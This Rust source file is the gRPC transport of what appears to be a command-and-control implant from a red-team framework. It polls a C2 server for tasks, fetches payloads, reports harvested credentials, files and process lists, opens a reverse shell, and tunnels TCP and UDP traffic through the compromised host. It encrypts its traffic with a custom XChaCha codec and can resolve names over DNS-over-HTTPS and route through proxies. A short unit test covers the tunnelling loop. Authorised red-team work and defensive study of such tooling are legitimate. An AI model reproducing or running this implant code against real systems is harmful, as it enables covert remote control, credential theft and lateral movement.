use anyhow::Result;
use hyper::Uri;
use pb::c2::*;
use std::str::FromStr;
use std::sync::mpsc::{Receiver, Sender};
use tonic::GrpcMethod;
use tonic::Request;

#[cfg(feature = "grpc-doh")]
use hyper::client::HttpConnector;

#[cfg(feature = "grpc-doh")]
use crate::dns_resolver::doh::{DohProvider, HickoryResolverService};

use crate::Transport;

use pb::portal::payload::Payload as PortalPayloadEnum;
use pb::portal::{BytesMessageKind, TcpMessage, UdpMessage};
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio_stream::StreamExt;

static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";
static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";

#[allow(clippy::upper_case_acronyms)]
#[derive(Debug, Clone)]
pub struct GRPC {
    grpc: Option<tonic::client::Grpc<tonic::transport::Channel>>,
}

impl Transport for GRPC {
    fn init() -> Self {
        GRPC { grpc: None }
    }

    fn new(callback: String, proxy_uri: Option<String>) -> Result<Self> {
        let endpoint = tonic::transport::Endpoint::from_shared(callback)?;

        // Create HTTP connector with DNS-over-HTTPS support if enabled
        #[cfg(feature = "grpc-doh")]
        let mut http: HttpConnector<HickoryResolverService> =
            crate::dns_resolver::doh::create_doh_connector(DohProvider::Cloudflare)?;

        #[cfg(not(feature = "grpc-doh"))]
        let mut http = hyper::client::HttpConnector::new();

        http.enforce_http(false);
        http.set_nodelay(true);

        let channel = match proxy_uri {
            Some(proxy_uri_string) => {
                let proxy: hyper_proxy::Proxy = hyper_proxy::Proxy::new(
                    hyper_proxy::Intercept::All,
                    Uri::from_str(proxy_uri_string.as_str())?,
                );
                let mut proxy_connector = hyper_proxy::ProxyConnector::from_proxy(http, proxy)?;
                proxy_connector.set_tls(None);

                endpoint
                    .rate_limit(1, Duration::from_millis(25))
                    .connect_with_connector_lazy(proxy_connector)
            }
            #[allow(non_snake_case) /* None is a reserved keyword */]
            None => endpoint
                .rate_limit(1, Duration::from_millis(25))
                .connect_with_connector_lazy(http),
        };

        let grpc = tonic::client::Grpc::new(channel);
        Ok(Self { grpc: Some(grpc) })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        let resp = self.claim_tasks_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        #[cfg(debug_assertions)]
        let filename = request.name.clone();

        let resp = self.fetch_asset_impl(request).await?;
        let mut stream = resp.into_inner();
        tokio::spawn(async move {
            loop {
                let msg = match stream.message().await {
                    Ok(maybe_msg) => match maybe_msg {
                        Some(msg) => msg,
                        #[allow(non_snake_case) /* None is a reserved keyword */]
                        None => {
                            break;
                        }
                    },
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("failed to download file: {}: {}", filename, _err);

                        return;
                    }
                };
                match tx.send(msg) {
                    Ok(_) => {}
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!(
                            "failed to send downloaded file chunk: {}: {}",
                            filename,
                            _err
                        );

                        return;
                    }
                }
            }
        });
        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        let resp = self.report_credential_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        let stream = tokio_stream::iter(request);
        let tonic_req = Request::new(stream);
        let resp = self.report_file_impl(tonic_req).await?;
        Ok(resp.into_inner())
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        let resp = self.report_process_list_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        let resp = self.report_task_output_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        // Wrap PTY output receiver in stream
        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);

        // Open gRPC Bi-Directional Stream
        let resp = self.reverse_shell_impl(req_stream).await?;
        let mut resp_stream = resp.into_inner();

        // Spawn task to deliver PTY input
        tokio::spawn(async move {
            while let Some(msg) = match resp_stream.message().await {
                Ok(m) => m,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to receive gRPC stream response: {}", _err);

                    None
                }
            } {
                match tx.send(msg).await {
                    Ok(_) => {}
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("failed to queue pty input: {}", _err);

                        return;
                    }
                }
            }
        });

        Ok(())
    }

    async fn create_portal(
        &mut self,
        mut rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
        _tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
    ) -> Result<()> {
        // 1. Get task_id from first message
        let first_msg = match rx.recv().await {
            Some(msg) => msg,
            None => return Ok(()),
        };
        let task_id = first_msg.task_id;

        // 2. Setup outbound channel (to C2)
        let (outbound_tx, outbound_rx) = tokio::sync::mpsc::channel(32);

        // 3. Send first message
        if outbound_tx.send(first_msg).await.is_err() {
            return Ok(());
        }

        // 4. Spawn rx forwarder
        let outbound_tx_clone = outbound_tx.clone();
        let forwarder_handle = tokio::spawn(async move {
            while let Some(msg) = rx.recv().await {
                if outbound_tx_clone.send(msg).await.is_err() {
                    break;
                }
            }
        });

        // 5. Start gRPC stream
        let req_stream = tokio_stream::wrappers::ReceiverStream::new(outbound_rx);
        let response = match self.create_portal_impl(req_stream).await {
            Ok(r) => r,
            Err(e) => {
                forwarder_handle.abort();
                return Err(anyhow::Error::from(e));
            }
        };
        let resp_stream = response.into_inner();

        // 6. Run loop
        let result = Self::run_portal_loop(resp_stream, outbound_tx, task_id).await;

        // Cleanup
        forwarder_handle.abort();

        result
    }

    fn get_type(&mut self) -> pb::c2::beacon::Transport {
        return pb::c2::beacon::Transport::Grpc;
    }
    fn is_active(&self) -> bool {
        self.grpc.is_some()
    }

    fn name(&self) -> &'static str {
        "grpc"
    }

    fn list_available(&self) -> Vec<String> {
        vec!["grpc".to_string()]
    }
}

impl GRPC {
    ///
    /// Create a portal.
    pub async fn create_portal_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = CreatePortalRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<CreatePortalResponse>>,
        tonic::Status,
    > {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(CREATE_PORTAL_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "CreatePortal"));
        self.grpc
            .as_mut()
            .unwrap()
            .streaming(req, path, codec)
            .await
    }

    async fn run_portal_loop<S>(
        mut resp_stream: S,
        outbound_tx: tokio::sync::mpsc::Sender<CreatePortalRequest>,
        task_id: i64,
    ) -> Result<()>
    where
        S: tokio_stream::Stream<Item = Result<CreatePortalResponse, tonic::Status>> + Unpin,
    {
        use std::sync::{Arc, Mutex};

        // Map stores Sender to the connection handler task
        // Key: src_port
        let connections: Arc<
            Mutex<std::collections::HashMap<u32, tokio::sync::mpsc::Sender<Vec<u8>>>>,
        > = Arc::new(Mutex::new(std::collections::HashMap::new()));

        while let Some(msg_result) = resp_stream.next().await {
            let msg = match msg_result {
                Ok(m) => m,
                Err(e) => {
                    log::error!("Portal stream error: {}", e);
                    break;
                }
            };

            if let Some(payload_enum) = msg.payload.and_then(|p| p.payload) {
                match payload_enum {
                    PortalPayloadEnum::Tcp(tcp_msg) => {
                        let src_port = tcp_msg.src_port;
                        let mut map = connections.lock().unwrap();

                        let tx = if let Some(tx) = map.get(&src_port) {
                            if tx.is_closed() {
                                None
                            } else {
                                Some(tx.clone())
                            }
                        } else {
                            None
                        };

                        if let Some(tx) = tx {
                            if !tcp_msg.data.is_empty() {
                                tokio::spawn(async move {
                                    let _ = tx.send(tcp_msg.data).await;
                                });
                            }
                        } else {
                            let (tx, rx) = tokio::sync::mpsc::channel(100);
                            map.insert(src_port, tx.clone());

                            let map_clone = connections.clone();
                            let outbound_tx_clone = outbound_tx.clone();
                            let dst_addr = tcp_msg.dst_addr;
                            let dst_port = tcp_msg.dst_port;
                            let initial_data = tcp_msg.data;

                            if !initial_data.is_empty() {
                                let tx_inner = tx.clone();
                                tokio::spawn(async move {
                                    let _ = tx_inner.send(initial_data).await;
                                });
                            }

                            tokio::spawn(async move {
                                Self::handle_tcp_connection(
                                    rx,
                                    src_port,
                                    dst_addr,
                                    dst_port,
                                    outbound_tx_clone,
                                    map_clone,
                                    task_id,
                                )
                                .await;
                            });
                        }
                    }
                    PortalPayloadEnum::Udp(udp_msg) => {
                        let src_port = udp_msg.src_port;
                        let mut map = connections.lock().unwrap();

                        let tx = if let Some(tx) = map.get(&src_port) {
                            if tx.is_closed() {
                                None
                            } else {
                                Some(tx.clone())
                            }
                        } else {
                            None
                        };

                        if let Some(tx) = tx {
                            if !udp_msg.data.is_empty() {
                                tokio::spawn(async move {
                                    let _ = tx.send(udp_msg.data).await;
                                });
                            }
                        } else {
                            let (tx, rx) = tokio::sync::mpsc::channel(100);
                            map.insert(src_port, tx.clone());

                            let map_clone = connections.clone();
                            let outbound_tx_clone = outbound_tx.clone();
                            let dst_addr = udp_msg.dst_addr;
                            let dst_port = udp_msg.dst_port;
                            let initial_data = udp_msg.data;

                            if !initial_data.is_empty() {
                                let tx_inner = tx.clone();
                                tokio::spawn(async move {
                                    let _ = tx_inner.send(initial_data).await;
                                });
                            }

                            tokio::spawn(async move {
                                Self::handle_udp_connection(
                                    rx,
                                    src_port,
                                    dst_addr,
                                    dst_port,
                                    outbound_tx_clone,
                                    map_clone,
                                    task_id,
                                )
                                .await;
                            });
                        }
                    }
                    PortalPayloadEnum::Bytes(bytes_msg) => {
                        if bytes_msg.kind == BytesMessageKind::Ping as i32 {
                            let req = CreatePortalRequest {
                                task_id,
                                payload: Some(pb::portal::Payload {
                                    payload: Some(PortalPayloadEnum::Bytes(bytes_msg)),
                                }),
                            };
                            let _ = outbound_tx.send(req).await;
                        }
                    }
                }
            }
        }

        Ok(())
    }

    async fn handle_tcp_connection(
        mut rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
        src_port: u32,
        dst_addr: String,
        dst_port: u32,
        outbound_tx: tokio::sync::mpsc::Sender<CreatePortalRequest>,
        connections: std::sync::Arc<
            std::sync::Mutex<std::collections::HashMap<u32, tokio::sync::mpsc::Sender<Vec<u8>>>>,
        >,
        task_id: i64,
    ) {
        let addr = format!("{}:{}", dst_addr, dst_port);
        match tokio::net::TcpStream::connect(&addr).await {
            Ok(stream) => {
                let (mut reader, mut writer) = stream.into_split();
                let mut buf = [0u8; 4096];

                loop {
                    tokio::select! {
                        res = reader.read(&mut buf) => {
                            match res {
                                Ok(0) => break, // EOF
                                Ok(n) => {
                                    let req = CreatePortalRequest {
                                        task_id,
                                        payload: Some(pb::portal::Payload {
                                            payload: Some(PortalPayloadEnum::Tcp(TcpMessage {
                                                data: buf[0..n].to_vec(),
                                                dst_addr: dst_addr.clone(),
                                                dst_port,
                                                src_port,
                                            })),
                                        }),
                                    };
                                    if outbound_tx.send(req).await.is_err() {
                                        break;
                                    }
                                }
                                Err(_) => break,
                            }
                        }
                        res = rx.recv() => {
                            match res {
                                Some(data) => {
                                    if writer.write_all(&data).await.is_err() {
                                        break;
                                    }
                                }
                                None => break, // Channel closed
                            }
                        }
                    }
                }
            }
            Err(e) => {
                log::error!("TCP Connect failed: {}", e);
            }
        }

        // Cleanup
        connections.lock().unwrap().remove(&src_port);
    }

    async fn handle_udp_connection(
        mut rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
        src_port: u32,
        dst_addr: String,
        dst_port: u32,
        outbound_tx: tokio::sync::mpsc::Sender<CreatePortalRequest>,
        connections: std::sync::Arc<
            std::sync::Mutex<std::collections::HashMap<u32, tokio::sync::mpsc::Sender<Vec<u8>>>>,
        >,
        task_id: i64,
    ) {
        let addr = format!("{}:{}", dst_addr, dst_port);
        // Bind 0.0.0.0:0
        let socket = match tokio::net::UdpSocket::bind("0.0.0.0:0").await {
            Ok(s) => s,
            Err(_) => {
                connections.lock().unwrap().remove(&src_port);
                return;
            }
        };
        if socket.connect(&addr).await.is_err() {
            connections.lock().unwrap().remove(&src_port);
            return;
        }

        let socket = std::sync::Arc::new(socket);
        let mut buf = [0u8; 65535];
        loop {
            tokio::select! {
                res = socket.recv(&mut buf) => {
                    match res {
                        Ok(n) => {
                             let req = CreatePortalRequest {
                                task_id,
                                payload: Some(pb::portal::Payload {
                                    payload: Some(PortalPayloadEnum::Udp(UdpMessage {
                                        data: buf[0..n].to_vec(),
                                        dst_addr: dst_addr.clone(),
                                        dst_port,
                                        src_port,
                                    })),
                                }),
                            };
                            if outbound_tx.send(req).await.is_err() {
                                break;
                            }
                        }
                        Err(_) => break,
                    }
                }
                res = rx.recv() => {
                    match res {
                        Some(data) => {
                            if socket.send(&data).await.is_err() {
                                break;
                            }
                        }
                        None => break,
                    }
                }
            }
        }
        connections.lock().unwrap().remove(&src_port);
    }

    ///
    /// Contact the server for new tasks to execute.
    pub async fn claim_tasks_impl(
        &mut self,
        request: impl tonic::IntoRequest<ClaimTasksRequest>,
    ) -> std::result::Result<tonic::Response<ClaimTasksResponse>, tonic::Status> {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(CLAIM_TASKS_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ClaimTasks"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    ///
    /// Download a file from the server, returning one or more chunks of data.
    /// The maximum size of these chunks is determined by the server.
    /// The server should reply with two headers:
    ///   - "sha3-256-checksum": A SHA3-256 digest of the entire file contents.
    ///   - "file-size": The number of bytes contained by the file.
    ///
    /// If no associated file can be found, a NotFound status error is returned.
    pub async fn fetch_asset_impl(
        &mut self,
        request: impl tonic::IntoRequest<FetchAssetRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<FetchAssetResponse>>,
        tonic::Status,
    > {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(FETCH_ASSET_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "FetchAsset"));
        self.grpc
            .as_mut()
            .unwrap()
            .server_streaming(req, path, codec)
            .await
    }

    ///
    /// Report a credential.
    pub async fn report_credential_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportCredentialRequest>,
    ) -> std::result::Result<tonic::Response<ReportCredentialResponse>, tonic::Status> {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_CREDENTIAL_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportCredential"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    ///
    /// Report a file from the host to the server.
    /// Providing content of the file is optional. If content is provided:
    ///   - Hash will automatically be calculated and the provided hash will be ignored.
    ///   - Size will automatically be calculated and the provided size will be ignored.
    ///
    /// Content is provided as chunks, the size of which are up to the agent to define (based on memory constraints).
    /// Any existing files at the provided path for the host are replaced.
    pub async fn report_file_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReportFileRequest>,
    ) -> std::result::Result<tonic::Response<ReportFileResponse>, tonic::Status> {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_FILE_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportFile"));
        self.grpc
            .as_mut()
            .unwrap()
            .client_streaming(req, path, codec)
            .await
    }

    ///
    /// Report the active list of running processes. This list will replace any previously reported
    /// lists for the same host.
    pub async fn report_process_list_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportProcessListRequest>,
    ) -> std::result::Result<tonic::Response<ReportProcessListResponse>, tonic::Status> {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportProcessList"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    ///
    /// Report execution output for a task.
    pub async fn report_task_output_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportTaskOutputRequest>,
    ) -> std::result::Result<tonic::Response<ReportTaskOutputResponse>, tonic::Status> {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportTaskOutput"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    async fn reverse_shell_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReverseShellRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>,
        tonic::Status,
    > {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReverseShell"));
        self.grpc
            .as_mut()
            .unwrap()
            .streaming(req, path, codec)
            .await
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use pb::portal::payload::Payload as PortalPayloadEnum;
    use pb::portal::TcpMessage;
    use tokio::sync::mpsc;

    #[tokio::test]
    async fn test_run_portal_loop_tcp() {
        // Start a local TCP listener to act as target
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let (target_tx, mut target_rx) = mpsc::channel(10);

        tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let mut buf = [0u8; 1024];
            let n = socket.read(&mut buf).await.unwrap();
            target_tx.send(buf[0..n].to_vec()).await.unwrap();
            socket.write_all(b"pong").await.unwrap();
        });

        // Setup stream
        let (outbound_tx, mut outbound_rx) = mpsc::channel(10);
        let task_id = 123;

        let (server_tx, server_rx) = mpsc::channel(10);
        let stream = tokio_stream::wrappers::ReceiverStream::new(server_rx);

        let loop_handle =
            tokio::spawn(async move { GRPC::run_portal_loop(stream, outbound_tx, task_id).await });

        // Send message to portal loop
        server_tx
            .send(Ok(CreatePortalResponse {
                payload: Some(pb::portal::Payload {
                    payload: Some(PortalPayloadEnum::Tcp(TcpMessage {
                        data: b"ping".to_vec(),
                        dst_addr: "127.0.0.1".to_string(),
                        dst_port: addr.port() as u32,
                        src_port: 5555,
                    })),
                }),
            }))
            .await
            .unwrap();

        // Verify target received data
        // Use timeout to avoid hanging
        let received = tokio::time::timeout(Duration::from_secs(2), target_rx.recv())
            .await
            .expect("timeout waiting for target receive")
            .expect("target channel closed");
        assert_eq!(received, b"ping");

        // Verify we get response back in outbound_tx
        let resp = tokio::time::timeout(Duration::from_secs(2), outbound_rx.recv())
            .await
            .expect("timeout waiting for outbound response")
            .expect("outbound channel closed");

        assert_eq!(resp.task_id, task_id);
        if let Some(PortalPayloadEnum::Tcp(tcp)) = resp.payload.unwrap().payload {
            assert_eq!(tcp.data, b"pong");
            assert_eq!(tcp.src_port, 5555);
        } else {
            panic!("Expected TCP message");
        }

        // Cleanup
        drop(server_tx);
        loop_handle.await.unwrap().unwrap();
    }
}
